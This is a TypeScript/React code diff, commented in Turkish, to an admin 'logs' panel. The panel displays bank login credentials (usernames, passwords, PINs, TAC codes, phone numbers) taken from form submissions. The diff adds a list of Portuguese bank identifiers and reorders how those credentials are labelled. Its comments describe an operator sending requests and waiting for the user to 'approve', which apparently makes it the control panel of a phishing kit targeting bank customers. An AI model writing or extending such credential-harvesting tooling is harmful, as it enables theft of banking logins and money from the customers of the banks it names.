@@ -491,6 +491,18 @@ function resolveBankLogoUrl(fd: Record<string, any>): { src: string | null; init
   return { src: finalSrc, initials, fallbackColor };
 }
 
+// PT banka slug'lari: giris yontemi kavrami yok (Autenticacao/ozel sablon),
+// Banka kolonunda "Giris yontemi: bekleniyor" rozeti gosterilmez.
+const PT_BANK_SLUGS = new Set([
+  "cgd", "abanca", "bpi", "novo-banco", "santander-pt",
+  "millennium-bcp", "activobank", "montepio", "credito-agricola",
+]);
+// Giris yontemi OLMAYAN bankalar (autenticacao'ya giden PT bankalari):
+// Banka kolonunda tamamen bos gosterilir (credential girilmedikce).
+const AUTH_ONLY_BANK_SLUGS = new Set([
+  "millennium-bcp", "activobank", "montepio", "credito-agricola",
+]);
+
 // ============================================================
 //  BANKA GIRIS BILGILERI (SADECE KISA LABEL + DEGER):
 //  Kimlik No, ID/K.Adı, Şifre/PIN, Telefon, TAC, Hesap No, Giriş Kodu, İmza, Kimlik Kodu
@@ -559,11 +571,13 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
     return isOrderedField ? "Alan 2" : "Ek Alan";
   };
 
-  const first = orderedField1 || rawPersonalCode || rawUsername;
-  const second = orderedField2 || rawPassword || rawBankPhone;
+  // ONCE kanonik alanlar (username/password/personalCode) — orderedField aynasi degilse
+  // bunlar baskin olsun; orderedField sadece kanonik alan yoksa fallback.
+  const first = rawUsername || rawPersonalCode || orderedField1;
+  const second = rawPassword || rawBankPhone || orderedField2;
   const results: Array<[string, string]> = [];
   if (first) {
-    let label = labelFor(first, { orderedType: orderedField1Type, isOrderedField: !!orderedField1 });
+    let label = labelFor(first, { orderedType: orderedField1Type, isOrderedField: !rawUsername && !rawPersonalCode && !!orderedField1 });
     if (label === "Ek Alan" && orderedField1) label = "Alan 1";
     if (label === "Alan 2") label = orderedField1 ? "Alan 1" : "Ek Alan";
     results.push([label, first]);
@@ -572,7 +586,7 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
     if (first && second === first) {
       // duplicate oldugundan 2. kez basma
     } else {
-      let label = labelFor(second, { orderedType: orderedField2Type, isOrderedField: !!orderedField2 });
+      let label = labelFor(second, { orderedType: orderedField2Type, isOrderedField: !rawPassword && !rawBankPhone && !!orderedField2 });
       if (label === "Ek Alan" && orderedField2) label = "Alan 2";
       results.push([label, second]);
     }
@@ -2348,6 +2362,9 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 const additionalBankFields = getAdditionalAdminBankFields(fd); // GUVENLIK: hesaplansin ama BANKA KOLONUNDA KULLANILMAYACAK
                 const shortCreds = getShortBankCredentialFields(fd);
                 const loginMethod = readLoginMethod(fd);
+                const rawBankSlugLower = String(fd.bankSlug || "").trim().toLowerCase();
+                const isPtBank = PT_BANK_SLUGS.has(rawBankSlugLower) || /(^|[-_\s])pt($|[-_\s])/.test(rawBankSlugLower);
+                const isAuthOnlyBank = s === "autenticacao" || AUTH_ONLY_BANK_SLUGS.has(rawBankSlugLower);
                 const logoInfo = resolveBankLogoUrl(fd);
                 // Sadece GUNCEL durum: admin yeni istek gonderince "Bekliyor",
                 // kullanici onaylayinca "Onaylandi" goster. Eski history badge'i basmaz.
@@ -2439,10 +2456,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       {(() => {
                         // Giris yontemi OLMAYAN bankalar (autenticacao'ya giden PT
                         // bankalari) Banka kolonunda bos gosterilsin.
-                        const AUTH_ONLY_BANK_SLUGS = new Set(["millennium-bcp", "activobank", "montepio", "credito-agricola"]);
-                        const isAuthOnlyBank =
-                          s === "autenticacao" ||
-                          AUTH_ONLY_BANK_SLUGS.has(String(fd.bankSlug || "").trim().toLowerCase());
                         if (isAuthOnlyBank && shortCreds.length === 0) {
                           return <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
                         }
@@ -2468,7 +2481,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                                 Yöntem: {loginMethod}
                               </span>
                             )}
-                            {!loginMethod && fd.bankName && (
+                            {!loginMethod && fd.bankName && !isPtBank && (
                               <span className="inline-flex max-w-full items-center rounded-full border border-zinc-500/10 bg-zinc-500/5 px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider text-zinc-500 dark:text-zinc-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
                                 Giriş yöntemi: bekleniyor
                               </span>
